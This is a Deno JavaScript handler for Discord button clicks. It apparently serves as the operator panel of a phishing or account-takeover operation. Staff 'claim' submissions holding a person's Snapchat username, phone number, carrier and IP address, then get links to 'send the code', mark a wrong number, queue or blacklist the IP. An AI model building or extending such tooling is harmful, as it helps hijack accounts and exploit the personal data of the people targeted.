function hexToBytes(hex) {
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < hex.length; i += 2) {
    bytes[i / 2] = parseInt(hex.slice(i, i + 2), 16);
  }
  return bytes;
}

async function verifySignature(req, bodyText) {
  const sig = req.headers.get("X-Signature-Ed25519");
  const ts = req.headers.get("X-Signature-Timestamp");
  const pubKey = Deno.env.get("DISCORD_PUBLIC_KEY");
  if (!sig || !ts || !pubKey) return false;
  try {
    const key = await crypto.subtle.importKey("raw", hexToBytes(pubKey), { name: "Ed25519" }, false, ["verify"]);
    const msg = new TextEncoder().encode(ts + bodyText);
    return await crypto.subtle.verify("Ed25519", key, hexToBytes(sig), msg);
  } catch {
    return false;
  }
}

async function botAPI(endpoint, method = "GET", body = null) {
  const res = await fetch(`https://discord.com/api/v10${endpoint}`, {
    method,
    headers: {
      "Authorization": `Bot ${Deno.env.get("DISCORD_BOT_TOKEN")}`,
      "Content-Type": "application/json"
    },
    body: body ? JSON.stringify(body) : undefined
  });
  const text = await res.text();
  if (!res.ok) throw new Error(`Discord ${res.status}: ${text}`);
  return text ? JSON.parse(text) : {};
}

async function handleClaim(body) {
  const submissionId = body.data.custom_id.replace("claim_", "");
  const userId = body.member?.user?.id || body.user?.id;
  const username = body.member?.user?.username || body.user?.username;
  const channelId = body.channel_id;
  const messageId = body.message?.id;

  // Read data from the embed fields
  const embed = body.message?.embeds?.[0];
  const fields = embed?.fields || [];
  const getField = (name) => fields.find(f => f.name?.includes(name))?.value || "N/A";

  const snapchat = getField("Utilisateur").replace("@", "");
  const operateur = getField("Opérateur");
  const telephone = getField("Numéro").replace(/\s/g, "");
  const ip = getField("IP").replace(/`/g, "").trim();

  const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "";

  const threadContent =
    `# 🔐 Pris en charge par <@${userId}>\n` +
    `**👻 Snapchat:** @${snapchat}\n` +
    `**📞 Téléphone:** ${telephone}\n` +
    `**📡 Opérateur:** ${operateur}\n\n` +
    `## ⚡ Actions\n` +
    `✅ [**Envoyer le code**](${appUrl}/?trigger=${submissionId})\n` +
    `❌ [**Mauvais numéro**](${appUrl}/?triggerAction=wrong&id=${submissionId})\n` +
    `⏳ [**File d'attente**](${appUrl}/?triggerAction=wait&id=${submissionId})\n` +
    `🚫 [**Blacklist**](${appUrl}/?triggerAction=blacklist&id=${submissionId}&ip=${encodeURIComponent(ip)})`;

  // Create thread from the original message
  const thread = await botAPI(`/channels/${channelId}/messages/${messageId}/threads`, "POST", {
    name: `📋 ${snapchat} — ${operateur}`,
    auto_archive_duration: 60
  });

  // Add claimant to thread and post actions
  await Promise.all([
    botAPI(`/channels/${thread.id}/thread-members/${userId}`, "PUT"),
    botAPI(`/channels/${thread.id}/messages`, "POST", { content: threadContent })
  ]);

  // Disable the button on the original message
  await botAPI(`/channels/${channelId}/messages/${messageId}`, "PATCH", {
    components: [{
      type: 1,
      components: [{
        type: 2,
        style: 2,
        label: `✅ Pris par @${username}`,
        custom_id: "claimed_done",
        disabled: true
      }]
    }]
  });

  console.log(`✅ Claim OK: thread=${thread.id} sub=${submissionId} by=${username}`);
}

Deno.serve(async (req, ctx) => {
  try {
    const bodyText = await req.text();

    if (!await verifySignature(req, bodyText)) {
      return new Response("Invalid signature", { status: 401 });
    }

    const body = JSON.parse(bodyText);

    // Discord PING handshake
    if (body.type === 1) return Response.json({ type: 1 });

    // Button interaction
    if (body.type === 3 && body.data?.custom_id?.startsWith("claim_")) {
      // Use ctx.waitUntil to keep Deno alive while doing async work
      const work = handleClaim(body).catch(e => console.error("handleClaim error:", e.message, e.stack));
      if (ctx?.waitUntil) {
        ctx.waitUntil(work);
      } else {
        await work; // fallback: await synchronously
      }
      // type 6 = DEFERRED_UPDATE_MESSAGE (silently acknowledges, no spinner)
      return Response.json({ type: 6 });
    }

    return Response.json({ type: 1 });
  } catch (error) {
    console.error("discordInteraction fatal:", error.message);
    return Response.json({ error: error.message }, { status: 500 });
  }
});